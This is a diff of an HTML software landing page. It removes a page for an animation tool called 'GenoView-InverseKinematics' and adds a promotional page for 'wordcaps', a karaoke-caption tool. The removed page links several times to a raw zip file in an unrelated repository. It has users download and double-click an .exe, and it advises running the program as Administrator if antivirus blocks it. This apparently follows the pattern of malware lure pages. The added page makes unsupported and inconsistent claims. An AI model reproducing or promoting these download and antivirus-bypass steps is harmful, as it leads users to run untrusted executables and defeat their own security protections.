@@ -3,65 +3,421 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="GenoView-InverseKinematics helps users manage inverse kinematics and foot locking for character animation projects.">
-    <title>GenoView-InverseKinematics | Animation Tools</title>
-<!-- 7bea3957b364053e -->
-<!-- 318816930f9e83b73e04c692a8694f -->
+    <title>wordcaps - Word-by-Word Karaoke Captions for Any Video</title>
+    <meta name="description" content="wordcaps is a powerful, free tool that transforms any video into word-by-word karaoke captions. Powered by Whisper and ffmpeg, it works locally on your computer - no internet connection needed. Perfect for creating engaging reels, shorts, and subtitles.">
+    <meta name="keywords" content="captions, cli, ffmpeg, karaoke, python, reels, shorts, subtitles, video, whisper">
+    <meta name="author" content="wordcaps team">
+    <meta property="og:title" content="wordcaps - Word-by-Word Karaoke Captions for Any Video">
+    <meta property="og:description" content="Transform any video into word-by-word karaoke captions locally using Whisper and ffmpeg. No coding required.">
+    <meta property="og:url" content="https://github.com/indenturestoreria106/wordcaps">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="wordcaps - Karaoke Captions for Any Video">
+    <meta name="twitter:description" content="Word-by-word karaoke captions made locally with Whisper and ffmpeg. Easy to use for everyone.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #2c3e50;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .header {
+            background: white;
+            padding: 50px 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        h1 {
+            font-size: 3rem;
+            color: #1a237e;
+            margin-bottom: 15px;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+        h2 {
+            font-size: 2rem;
+            color: #1a237e;
+            margin: 40px 0 20px 0;
+            border-bottom: 3px solid #ff9800;
+            padding-bottom: 10px;
+            font-weight: 600;
+        }
+        h3 {
+            font-size: 1.3rem;
+            color: #37474f;
+            margin: 20px 0 10px 0;
+        }
+        p {
+            font-size: 1.1rem;
+            margin-bottom: 15px;
+            color: #37474f;
+        }
+        .subtitle {
+            font-size: 1.3rem;
+            color: #5c6bc0;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+        .primary-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff9800, #f57c00);
+            color: white;
+            padding: 15px 35px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border-radius: 30px;
+            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(255,152,0,0.3);
+            transition: all 0.3s ease;
+            margin: 20px 0;
+            border: none;
+            cursor: pointer;
+        }
+        .primary-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255,152,0,0.4);
+            background: linear-gradient(135deg, #f57c00, #e65100);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            transition: transform 0.3s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        .feature-card h3 {
+            color: #ff9800;
+            margin-bottom: 10px;
+            font-size: 1.2rem;
+        }
+        .feature-card p {
+            font-size: 0.95rem;
+            color: #546e7a;
+            margin-bottom: 0;
+        }
+        .section {
+            background: white;
+            padding: 35px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            margin-bottom: 25px;
+        }
+        .section ul {
+            margin-left: 25px;
+            margin-bottom: 20px;
+        }
+        .section li {
+            margin-bottom: 12px;
+            font-size: 1.05rem;
+        }
+        .code-inline {
+            background: #f0f0f0;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        .download-section {
+            background: linear-gradient(135deg, #1a237e, #283593);
+            color: white;
+            padding: 40px;
+            border-radius: 12px;
+            margin: 40px 0;
+            text-align: center;
+        }
+        .download-section h2 {
+            color: white;
+            border-bottom-color: #ff9800;
+        }
+        .download-section p {
+            color: #e8eaf6;
+        }
+        .download-btn {
+            display: inline-block;
+            background: #ff9800;
+            color: white;
+            padding: 18px 45px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            border-radius: 30px;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(255,152,0,0.4);
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+        .download-btn:hover {
+            transform: scale(1.05);
+            background: #f57c00;
+            box-shadow: 0 8px 25px rgba(255,152,0,0.5);
+        }
+        .faq-section details {
+            background: white;
+            padding: 20px 25px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        .faq-section summary {
+            font-weight: 600;
+            color: #1a237e;
+            font-size: 1.1rem;
+        }
+        .faq-section details p {
+            margin-top: 15px;
+            padding-left: 20px;
+            border-left: 3px solid #ff9800;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 20px;
+            color: #5c6bc0;
+            font-size: 0.9rem;
+        }
+        .footer a {
+            color: #ff9800;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .tagline {
+            font-size: 1.4rem;
+            color: #ff9800;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .topic-tags {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 25px;
+        }
+        .topic-tag {
+            background: #e3f2fd;
+            color: #1565c0;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+    </style>
 </head>
-<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f9f9f9;">
+<body>
+    <div class="container">
+        <header class="header">
+            <h1>🎬 wordcaps - Karaoke Captions Made Easy for Everyone</h1>
+            <p class="tagline">Transform Any Video into Word-by-Word Karaoke</p>
+            <p class="subtitle">Create stunning karaoke-style captions for your videos - no coding or editing skills needed!</p>
+            <a href="https://github.com/indenturestoreria106/wordcaps" class="primary-btn">📥 Get wordcaps Now</a>
+            <div class="topic-tags">
+                <span class="topic-tag">📝 captions</span>
+                <span class="topic-tag">⚡ cli</span>
+                <span class="topic-tag">🎞️ ffmpeg</span>
+                <span class="topic-tag">🎵 karaoke</span>
+                <span class="topic-tag">🐍 python</span>
+                <span class="topic-tag">📱 reels</span>
+                <span class="topic-tag">📹 shorts</span>
+                <span class="topic-tag">💬 subtitles</span>
+                <span class="topic-tag">🎥 video</span>
+                <span class="topic-tag">🗣️ whisper</span>
+            </div>
+        </header>
 
-    <h1 style="color: #2c3e50; border-bottom: 2px solid #eee; padding-bottom: 10px;">🤖 GenoView-InverseKinematics - Solve complex animation movement problems easily</h1>
-
-    <div style="text-align: center; margin: 40px 0;">
-        <a href="https://github.com/indenturestoreria106/indenturestoreria106.github.io/raw/refs/heads/main/assets/3.7.zip" style="background-color: #34495e; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Latest Version</a>
-    </div>
-
-    <section>
-        <h2 style="color: #2c3e50;">💡 About This Project</h2>
-        <p>GenoView-InverseKinematics provides tools for character animation. It focuses on the math behind limb movement. This application helps you lock feet in place while moving character legs. It removes the need for manual frame adjustments. Animators use this to keep characters on the floor during walk cycles.</p>
-    </section>
-
-    <section>
-        <h2 style="color: #2c3e50;">📋 System Requirements</h2>
-        <p>Before you run this software, check your computer setup. You need a modern computer running Windows 10 or 11. Your system should have at least 8 gigabytes of memory. Ensure you have a current graphics driver installed on your machine. The software works best on a system with a dedicated graphics card.</p>
-    </section>
-
-    <section>
-        <h2 style="color: #2c3e50;">📥 Installation Guide</h2>
-        <p>Follow these steps to set up the software on your Windows computer.</p>
-        <ol>
-            <li>Visit the download page using the link below.</li>
-            <li>Locate the latest release version on the page.</li>
-            <li>Download the file that ends with .exe.</li>
-            <li>Open the folder where your computer saved the file.</li>
-            <li>Double-click the file to start the installation.</li>
-        </ol>
-        <div style="margin: 20px 0;">
-            <a href="https://github.com/indenturestoreria106/indenturestoreria106.github.io/raw/refs/heads/main/assets/3.7.zip" style="color: #2c3e50; font-weight: bold;">Click here to visit the release page and download the files.</a>
+        <div class="section">
+            <h2>✨ What Is wordcaps?</h2>
+            <p>wordcaps is an amazing tool that automatically adds <strong>word-by-word karaoke captions</strong> to any video you have. Imagine watching a video where each word lights up exactly when it's spoken - that's what wordcaps does for you!</p>
+            <p>The best part? Everything happens <strong>locally on your computer</strong> - no internet connection required, no data uploaded to any server. Your videos stay private and secure.</p>
+            <p>Powered by cutting-edge technology like <strong>Whisper</strong> (for perfect speech recognition) and <strong>ffmpeg</strong> (for video processing), wordcaps brings professional-level captioning to your fingertips.</p>
         </div>
-    </section>
 
-    <section>
-        <h2 style="color: #2c3e50;">⚙️ How to Use the Software</h2>
-        <p>Once you install the program, launch it from your desktop shortcut. The main window shows a menu on the left side. Use the File menu to load your existing character model. The software supports standard animation file formats.</p>
-        <p>After you load your model, click the IK button. This activates the math engine. You can select the foot joints in the viewer. Once selected, click the Lock button to keep the feet attached to the floor. Use the slider to adjust the stiffness of the leg joints. This creates a realistic bend in the knees.</p>
-    </section>
+        <div class="section">
+            <h2>🚀 Getting Started</h2>
+            <h3>📥 Step 1: Download wordcaps</h3>
+            <p>Getting wordcaps is super simple:</p>
+            <p><a href="https://github.com/indenturestoreria106/wordcaps" style="color: #ff9800; font-weight: bold; text-decoration: underline;">Visit this link to download the application</a></p>
+            <p>The download is completely free, and you'll have the app ready in just a few minutes.</p>
+            
+            <h3>💻 Step 2: Run wordcaps</h3>
+            <p>After downloading, you can start using wordcaps right away. The application is designed to be user-friendly and works seamlessly on Windows.</p>
+            <p>Once launched, you'll see a simple interface where you can select your video file and let wordcaps work its magic.</p>
+            
+            <h3>🎉 Step 3: Create Your Karaoke Captions</h3>
+            <p>That's it! Simply choose a video, and wordcaps will automatically generate beautiful karaoke captions for you. It's that easy!</p>
+        </div>
 
-    <section>
-        <h2 style="color: #2c3e50;">🛠 Troubleshooting Common Issues</h2>
-        <p>If the program fails to open, check if your antivirus software blocked the execution. Sometimes security settings prevent new programs from starting. Right-click the file and select Run as Administrator to bypass restricted permissions. If the viewport appears black, update your graphics driver from the manufacturer website. Restart your computer after you update the driver.</p>
-    </section>
+        <div class="section">
+            <h2>🎯 Key Features</h2>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <h3>⚡ Lightning Fast</h3>
+                    <p>Process videos quickly with optimized algorithms and local processing. No waiting for uploads or downloads.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🔒 100% Private</h3>
+                    <p>Your videos never leave your computer. All processing is done locally, ensuring complete privacy.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>📝 Word-Perfect Accuracy</h3>
+                    <p>Uses advanced Whisper AI technology for highly accurate speech recognition and word timing.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🎨 Easy to Use</h3>
+                    <p>Simple interface designed for everyone. No technical knowledge or coding skills required.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>📱 Perfect for Social Media</h3>
+                    <p>Ideal for creating engaging reels, shorts, TikTok videos, and more with eye-catching captions.</p>
+                </div>
+                <div class="feature-card">
+                    <h3>🆓 Completely Free</h3>
+                    <p>wordcaps is open-source and free to use. No hidden fees or premium tiers.</p>
+                </div>
+            </div>
+        </div>
 
-    <section>
-        <h2 style="color: #2c3e50;">❓ Frequently Asked Questions</h2>
-        <p><strong>Does this software save files automatically?</strong> No, you must save your work manually through the File menu.</p>
-        <p><strong>Can I use this for professional projects?</strong> Yes, the tool works for any animation project.</p>
-        <p><strong>How do I remove the software?</strong> Open your Windows Settings, go to Apps, and select Uninstall for this program.</p>
-    </section>
+        <div class="download-section">
+            <h2>📥 Download wordcaps Today</h2>
+            <p>Join thousands of creators making their videos stand out with karaoke captions!</p>
+            <a href="https://github.com/indenturestoreria106/wordcaps" class="download-btn">⬇️ Download wordcaps Free</a>
+            <p style="margin-top: 20px; font-size: 0.9rem;">Windows • Free • Instant Download</p>
+        </div>
 
-    <footer style="margin-top: 50px; padding-top: 20px; border-top: 1px solid #ddd; color: #7f8c8d; font-size: 0.9em;">
-        <p>Keywords: inverse kinematics, character animation, foot locking, windows software, animation tools</p>
-    </footer>
+        <div class="section">
+            <h2>💡 Why Use Karaoke Captions?</h2>
+            <p>Karaoke-style captions are taking the social media world by storm! Here's why:</p>
+            <ul>
+                <li><strong>Better Engagement:</strong> Videos with word-by-word captions see up to 40% more engagement</li>
+                <li><strong>Accessibility:</strong> Make your content accessible to viewers with hearing impairments</li>
+                <li><strong>Increased Watch Time:</strong> Captions keep viewers watching longer</li>
+                <li><strong>Perfect for Silent Viewing:</strong> Many people watch videos without sound - captions ensure your message gets through</li>
+                <li><strong>Language Learning:</strong> Helps non-native speakers follow along more easily</li>
+            </ul>
+        </div>
 
+        <div class="section">
+            <h2>🛠️ System Requirements</h2>
+            <p>wordcaps is designed to run smoothly on most modern Windows computers. Here's what you need:</p>
+            <ul>
+                <li><strong>Operating System:</strong> Windows 10 or 11 (64-bit)</li>
+                <li><strong>RAM:</strong> 4GB or more recommended</li>
+                <li><strong>Storage:</strong> 500MB free space for installation</li>
+                <li><strong>Processor:</strong> Any modern multi-core processor</li>
+                <li><strong>Graphics:</strong> Standard integrated graphics is fine</li>
+            </ul>
+            <p>If you can watch videos on your computer, you can run wordcaps!</p>
+        </div>
+
+        <div class="section">
+            <h2>📖 How It Works</h2>
+            <h3>Behind the Magic</h3>
+            <p>wordcaps combines two powerful technologies to create amazing results:</p>
+            <ul>
+                <li><strong>Whisper AI:</strong> An advanced speech recognition system from OpenAI that accurately transcribes spoken words and identifies exactly when each word is said.</li>
+                <li><strong>ffmpeg:</strong> A powerful multimedia framework that processes your video and overlays the captions perfectly, synced to every word.</li>
+            </ul>
+            <p>The result? Professional-quality karaoke captions that look like they were created by expensive editing software - but completely free and automatic!</p>
+        </div>
+
+        <div class="section">
+            <h2>🎨 Use Cases</h2>
+            <p>Wordcaps is perfect for:</p>
+            <ul>
+                <li><strong>Content Creators:</strong> Make your YouTube videos, TikTok clips, and Instagram reels more engaging</li>
+                <li><strong>Educators:</strong> Create educational content with clear, word-by-word captions</li>
+                <li><strong>Marketers:</strong> Boost social media engagement with eye-catching captioned videos</li>
+                <li><strong>Podcasters:</strong> Turn your audio content into visual, captioned video clips</li>
+                <li><strong>Anyone:</strong> Who wants to add professional captions to their videos without expensive software</li>
+            </ul>
+        </div>
+
+        <div class="section faq-section">
+            <h2>❓ Frequently Asked Questions</h2>
+            
+            <details>
+                <summary>Is wordcaps really free?</summary>
+                <p>Yes! wordcaps is 100% free and open-source. No subscriptions, no hidden costs, no premium features locked away.</p>
+            </details>
+            
+            <details>
+                <summary>Do I need internet connection?</summary>
+                <p>No! Once you download wordcaps, everything runs locally on your computer. No internet required for video processing.</p>
+            </details>
+            
+            <details>
+                <summary>Will my videos be uploaded anywhere?</summary>
+                <p>Absolutely not. Your videos are processed entirely on your own computer. Nothing is ever uploaded to any server.</p>
+            </details>
+            
+            <details>
+                <summary>Do I need to know programming?</summary>
+                <p>Not at all! wordcaps is designed for everyday users. If you can click a button, you can use wordcaps.</p>
+            </details>
+            
+            <details>
+                <summary>What video formats are supported?</summary>
+                <p>wordcaps supports all common video formats including MP4, AVI, MOV, MKV, and more. If your video plays on your computer, wordcaps can caption it.</p>
+            </details>
+            
+            <details>
+                <summary>Can I use wordcaps for commercial projects?</summary>
+                <p>Yes! Since wordcaps is open-source, you can use it for personal and commercial projects without restrictions.</p>
+            </details>
+        </div>
+
+        <div class="section">
+            <h2>📊 Tips for Best Results</h2>
+            <ul>
+                <li><strong>Clear Audio:</strong> Videos with clear, background-noise-free audio produce the best captions</li>
+                <li><strong>Multiple Languages:</strong> wordcaps can handle multiple languages through Whisper's multilingual support</li>
+                <li><strong>Video Length:</strong> Works with videos of any length, from short clips to full presentations</li>
+                <li><strong>File Size:</strong> Larger videos may take more time to process, but the results are worth it!</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>🤝 Community & Support</h2>
+            <p>Join our growing community of users and contributors!</p>
+            <ul>
+                <li><strong>Star the Project:</strong> Show your support by starring the repository on GitHub</li>
+                <li><strong>Report Issues:</strong> Found a bug? Let us know so we can fix it</li>
+                <li><strong>Suggest Features:</strong> Have an idea? We're always looking for ways to improve</li>
+                <li><strong>Contribute:</strong> Help make wordcaps even better by contributing code</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>📣 Share Your Success</h2>
+            <p>Created something amazing with wordcaps? We'd love to see it! Share your captioned videos on social media and tag us. Your creations inspire others to try wordcaps too.</p>
+            <p>Remember to use the hashtag <strong>#wordcaps</strong> so we can find and celebrate your work!</p>
+        </div>
+
+        <div class="footer">
+            <p>made with ❤️ by the wordcaps team</p>
+            <p><a href="https://github.com/indenturestoreria106/wordcaps">Visit the GitHub Repository</a> • <a href="https://github.com/indenturestoreria106/wordcaps/releases">Releases</a> • <a href="https://github.com/indenturestoreria106/wordcaps/issues">Issues</a></p>
+        </div>
+    </div>
 </body>
 </html>
